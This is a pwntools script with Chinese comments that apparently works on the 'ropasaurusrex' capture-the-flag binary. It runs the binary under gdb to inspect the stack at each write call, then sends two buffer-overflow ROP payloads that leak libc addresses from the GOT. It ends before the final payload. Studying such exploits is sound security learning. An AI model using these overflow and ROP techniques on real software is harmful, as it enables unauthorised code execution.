from pwn import *

# 启动带gdb的进程
sh = gdb.debug('./ropasaurusrex', '''
# 在main函数设置断点
break main

# 在漏洞函数ret处
break *0x08048441

# 在write@plt处
break write

# 查看每次write调用
commands 3
  echo "\\n=== Write函数调用 ==="
  echo "返回地址位置 (esp):"
  x/1wx $esp
  echo "\\n参数列表:"
  x/4wx $esp+4
  printf "fd = %d\\n", *(int*)($esp+4)
  printf "buf = 0x%x\\n", *(int*)($esp+8)
  printf "count = %d\\n", *(int*)($esp+12)
  echo "\\n当前栈布局:"
  x/30wx $esp
  continue
end

continue
''')

rop = ELF('./ropasaurusrex')

write_plt = rop.plt['write']
libc_start_main_got = rop.got['__libc_start_main']
read_got = rop.got['read']

print("=== 发送payload1 ===")
payload1 = flat(['b'*140, write_plt, p32(0x80483F4), p32(1), libc_start_main_got, p32(4)])
sh.sendline(payload1)

# gdb会自动中断，查看栈布局后继续
input("查看gdb窗口，按回车继续...")

libc_start_main_addr = u32(sh.recv()[0:4])
print(f"libc_start_main地址: {hex(libc_start_main_addr)}")

print("\n=== 发送payload2 ===")
payload2 = flat(['b'*140, write_plt, p32(0x80483F4), p32(1), read_got, p32(4)])
sh.sendline(payload2)

read_addr = u32(sh.recv()[0:4])
print(f"read地址: {hex(read_addr)}")

# 这里获取libc信息并发送最后的payload...